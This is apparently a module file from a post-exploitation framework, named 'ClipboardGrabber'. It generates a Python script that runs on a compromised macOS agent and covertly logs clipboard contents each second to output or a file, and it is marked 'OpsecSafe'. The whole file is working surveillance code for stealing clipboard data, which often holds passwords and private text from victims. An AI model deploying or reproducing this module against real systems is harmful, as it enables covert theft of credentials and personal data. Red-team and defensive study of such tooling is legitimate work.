class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'ClipboardGrabber',
            'Author': ['@424f424f'],
            'Description': 'This module will write log output of clipboard to stdout (or disk).',
            'Background': False,
            'OutputExtension': "",
            'NeedsAdmin': False,
            'OpsecSafe': True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ['']
        }
        self.options = {
            'Agent': {
                'Description'   :   'Agent to grab clipboard from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile': {
                'Description'   :   'Optional file to save the clipboard output to.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'MonitorTime': {
                'Description'   :   'Optional for how long you would like to monitor clipboard in (s).',
                'Required'      :   True,
                'Value'         :   '0'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        outFile = self.options['OutFile']['Value']
        monitorTime = self.options['MonitorTime']['Value']
        script = """
def func(monitortime=0):
    from AppKit import NSPasteboard, NSStringPboardType
    import time
    import datetime
    import sys
    sleeptime = 0
    last = ''
    outFile = '%s'
    while sleeptime <= monitortime:
        try:
            pb = NSPasteboard.generalPasteboard()
            pbstring = pb.stringForType_(NSStringPboardType)
            if pbstring != last:
                if outFile != "":
                    f = file(outFile, 'a+')
                    f.write(pbstring)
                    f.close()
                    print "clipboard written to",outFile
                else:
                    ts = time.time()
                    st = datetime.datetime.fromtimestamp(ts).strftime('%%Y-%%m-%%d %%H:%%M:%%S')
                    print st + ": %%s".encode("utf-8") %% repr(pbstring)
            last = pbstring
            time.sleep(1)
            sleeptime += 1
        except Exception as e:
            print e
func(monitortime=%s)""" % (outFile,monitorTime)
        return script